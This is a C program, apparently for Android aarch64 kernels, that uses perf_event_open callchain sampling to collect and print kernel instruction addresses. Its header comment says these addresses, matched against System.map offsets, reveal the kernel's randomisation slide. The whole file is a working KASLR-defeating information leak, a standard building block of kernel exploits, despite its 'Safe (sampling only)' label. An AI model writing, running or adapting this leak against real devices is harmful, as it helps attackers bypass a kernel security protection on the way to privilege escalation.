/* verify_offsets.c v5 — perf + CALLCHAIN. Safe (sampling only).
 * Collects kernel call chains; IP differences within a chain equal function
 * offset differences from System.map (slide-independent) -> yields the slide.
 * Build: aarch64-linux-android30-clang -O2 -static -pie -fPIE
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <stdlib.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <linux/perf_event.h>

#ifndef __NR_perf_event_open
#define __NR_perf_event_open 241
#endif
static long peropen(struct perf_event_attr *a, pid_t p, int c, int g, unsigned long f)
{ return syscall(__NR_perf_event_open, a, p, c, g, f); }

#define RP 16
static uint64_t chains[4096][12]; static int cn[4096]; static int nchain=0;

static void drain(void *base, size_t pg, size_t ds, struct perf_event_mmap_page *meta)
{
    char *data=(char*)base+pg;
    __sync_synchronize();
    uint64_t head=meta->data_head;
    while(meta->data_tail<head){
        struct perf_event_header *h=(void*)(data+(meta->data_tail%ds));
        if(h->size<sizeof(*h)){meta->data_tail=head;break;}
        if(h->type==PERF_RECORD_SAMPLE){
            char *q=(char*)h+sizeof(*h);
            uint64_t ip; memcpy(&ip,q,8); q+=8;
            uint64_t nr; memcpy(&nr,q,8); q+=8;
            if(nr>12) nr=12;
            if(nchain<4096 && ip>=0xffff000000000000UL){
                chains[nchain][0]=ip; int n=1;
                for(uint64_t k=0;k<nr;k++){ uint64_t c; memcpy(&c,q,8); q+=8;
                    if(c>=0xffff000000000000UL && n<12) chains[nchain][n++]=c; }
                cn[nchain]=n; nchain++;
            }
        }
        meta->data_tail+=h->size;
    }
}

int main(void){
    setvbuf(stdout,NULL,_IONBF,0);
    printf("=== verify_offsets v5 (callchain) ===\n");
    struct perf_event_attr a; memset(&a,0,sizeof(a));
    a.type=PERF_TYPE_HARDWARE; a.size=sizeof(a); a.config=PERF_COUNT_HW_INSTRUCTIONS;
    a.sample_type=PERF_SAMPLE_IP|PERF_SAMPLE_CALLCHAIN; a.sample_period=120000;
    a.disabled=1; a.exclude_kernel=0; a.exclude_hv=1; a.wakeup_events=1;
    int fd=(int)peropen(&a,0,-1,-1,0);
    if(fd<0){ printf("[!] perf errno=%d (%s)\n",errno,strerror(errno)); return 1; }
    size_t pg=sysconf(_SC_PAGESIZE), ds=RP*pg, ms=ds+pg;
    void *base=mmap(NULL,ms,PROT_READ|PROT_WRITE,MAP_SHARED,fd,0);
    if(base==MAP_FAILED){printf("[!] mmap errno=%d\n",errno);return 1;}
    struct perf_event_mmap_page *meta=base;
    ioctl(fd,PERF_EVENT_IOC_RESET,0); ioctl(fd,PERF_EVENT_IOC_ENABLE,0);
    for(long i=0;i<8000000 && nchain<4096;i++){ syscall(172); if((i&0x3fff)==0) drain(base,pg,ds,meta); }
    ioctl(fd,PERF_EVENT_IOC_DISABLE,0); munmap(base,ms); close(fd);
    printf("chains=%d\n",nchain);
    /* print the first 24 distinct chains (min 3 frames) */
    int printed=0;
    for(int i=0;i<nchain && printed<24;i++){
        if(cn[i]<3) continue;
        printf("chain[%d] nr=%d:",i,cn[i]);
        for(int k=0;k<cn[i];k++) printf(" %llx",(unsigned long long)chains[i][k]);
        printf("\n");
        printed++;
    }
    return 0;
}
